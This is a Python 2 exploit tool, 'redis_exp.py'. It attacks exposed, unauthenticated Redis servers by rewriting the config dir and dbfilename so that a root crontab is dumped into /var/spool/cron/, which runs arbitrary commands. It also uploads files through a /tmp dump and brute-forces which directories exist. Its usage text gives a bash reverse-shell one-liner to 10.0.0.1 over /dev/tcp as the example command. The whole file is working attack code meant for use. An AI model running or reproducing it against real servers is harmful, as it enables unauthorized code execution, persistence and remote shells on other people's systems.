#!/usr/bin/env python
#-*- coding:utf8 -*-
#@author: 00theway
#@file: redis_exp.py
#@time: 2017/3/29 下午6:40

import redis,sys,time
from optparse import OptionParser

class REDIS_EXP:
    def __init__(self,host,port=6379):
        self.host = host
        self.port = port

        self.INFO = 0
        self.ERROR = 1

        self.default = {'dir':'',
                        'dbfilename':'',
                        'rdbcompression':''}

        self.crond = ''
        self.r = redis.StrictRedis(host=self.host, port=self.port, db=0)
        try:
            self.get_default_config()
            self.output("default config:",self.INFO)
            self.output("dir:"+ self.default['dir'], self.INFO)
            self.output("dbfilename:" + self.default['dbfilename'], self.INFO)
            self.output("rdbcompression:" + self.default['rdbcompression'], self.INFO)

        except Exception,e:
            self.output("get default config",self.ERROR)
            self.output(e.message,self.ERROR)
            sys.exit(1)

    # recover config
    def __del__(self):
        self.r.config_set('dir', self.default['dir'])
        self.r.config_set('dbfilename', self.default['dbfilename'])
        self.r.config_set('rdbcompression', self.default['rdbcompression'])

    def output(self,msg,level=0):
        if level == self.ERROR:
            print "\033[31;3m [ERROR] %s \033[0m" % (msg)
        if level == self.INFO:
            print "\033[32;3m [INFO]%s \033[0m" % (msg)

    # call before execute
    def generate_crond(self,command,time_delay):
        server_time = self.r.time()[0] + time_delay * 60
        m_time = time.localtime(server_time)

        m_min = m_time.tm_min
        m_mon = m_time.tm_mon
        m_day = m_time.tm_mday
        m_hour = m_time.tm_hour

        self.crond = '\n\n%s %s %s %s * %s\n\n' % (m_min, m_hour, m_day, m_mon, command)


    # call at init
    def get_default_config(self):
        default = self.r.config_get()
        self.default = default
        pass

    # call after set_local_file and set_remote_file
    def upload_file(self,local_file,remote_file):
        separator = '3b762cc137d55f4dcf4fe184ccc1dc15'
        self.output('uploading files',self.INFO)
        try:
            data = open(local_file,'rb').read()
        except Exception,e:
            self.output("open file %s error" % (local_file),self.ERROR)
            self.output(e.message,self.ERROR)
            sys.exit(1)

        m_data = '\n%s%s%s\n' % (separator,data,separator)

        try:
            self.r.config_set('dir','/tmp/')
        except Exception,e:
            self.output('config set dir /tmp/',self.ERROR)
            self.output(e.message,self.ERROR)
            sys.exit()

        self.r.config_set('dbfilename','0ttt')
        self.r.config_set('rdbcompression','no')
        self.r.flushall()
        self.r.set('data',m_data)
        self.r.save()

        #recover db config
        self.r.delete('data')

        command = '''python -c 'open("%s","ab+").write(open("/tmp/0ttt","rb").read().split("%s")[1])' ''' % (remote_file,separator)
        self.execute(command)
        self.output('file upload done',self.INFO)

    # call after set_command
    def execute(self,command,time_delay=2):
        self.generate_crond(command,time_delay)
        try:
            self.r.config_set('dir','/var/spool/cron/')
        except Exception,e:
            self.output('config set dir /var/spool/cron',self.ERROR)
            self.output(e.message,self.ERROR)
            sys.exit()
        self.r.config_set('dbfilename','root')
        self.r.flushall()
        self.r.set('shell',self.crond)
        self.r.save()
        self.r.delete('shell')

        self.output('cron set ok',self.INFO)

        for i in range(time_delay * 60):
            sys.stdout.write('\r\033[32;3m [INFO] wait {0}seconds for command execute \033[0m'.format((time_delay * 60) - i))
            sys.stdout.flush()
            time.sleep(1)
        print ''

        self.output('command execute done',self.INFO)

    def broute_dir(self,dirs_file):
        self.output("broute dir")
        try:
            dirs = open(dirs_file).readlines()
        except Exception,e:
            self.output('open file %s error' % dirs_file,self.ERROR)
            self.output(e.message,self.ERROR)
            sys.exit()

        for d_path in dirs:
            d_path = d_path.strip()
            try:
                self.r.config_set('dir',d_path)
                print '[path exests]',d_path
            except Exception,e:
                if "Permission denied" in e.message:
                    print '[Permission denied]',d_path
                else:
                    pass




def get_paras():
    usage = '''python redis_exp.py --host *.*.*.* [options]
    command execute:python redis_exp.py --host *.*.*.* -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
    file upload:python redis_exp.py --host *.*.*.* -l /data/reverse.sh -r /tmp/r.sh
    path brute fource:python redis_exp.py --host *.*.*.* -f /data/path.txt'''
    parser = OptionParser(usage)
    parser.add_option('--host',dest='host',help='the redis ip')
    parser.add_option('-p',dest="port",type='int',default=6379,help="the redis port,default is 6379")

    parser.add_option('-f',dest="file",help="file path to brute fource")
    parser.add_option('-l',dest="l_file",help="local file to upload")
    parser.add_option('-r',dest="r_file",help="remote path to store file")
    parser.add_option('-c',dest="command",help="the command to execute")
    parser.add_option('-t', dest="time_delay",type='int',default=2,help="the time between crontad created and command execute,default 2mins")

    (options, args) = parser.parse_args()



    arg_host = options.host
    arg_port = int(options.port)

    if arg_host == None or arg_port == None:
        print "\033[31;3m [ERROR] %s \033[0m" % 'host or port error'
        print usage
        sys.exit()

    arg_command = options.command
    arg_time_delay = options.time_delay

    arg_l_file = options.l_file
    arg_r_file = options.r_file

    arg_dirs_file = options.file

    if arg_command == None and (arg_l_file == None or arg_r_file==None) and arg_dirs_file == None:
        print "\033[31;3m [ERROR] %s \033[0m" % 'need options'
        print usage
        sys.exit()

    paras = {'host':arg_host,
             'port':arg_port,
             'command':arg_command,
             'time_delay':arg_time_delay,
             'l_file':arg_l_file,
             'r_file':arg_r_file,
             'dirs_file':arg_dirs_file}
    return paras





if '__main__' == __name__:
    paras = get_paras()

    host = paras['host']
    port = paras['port']
    command = paras['command']
    time_delay = paras['time_delay']
    l_file = paras['l_file']
    r_file = paras['r_file']
    dirs_file = paras['dirs_file']
    r = REDIS_EXP(host,port)
    if command != None:
        r.execute(command,time_delay)
    elif dirs_file != None:
        r.broute_dir(dirs_file)
    else:
        r.upload_file(l_file,r_file)




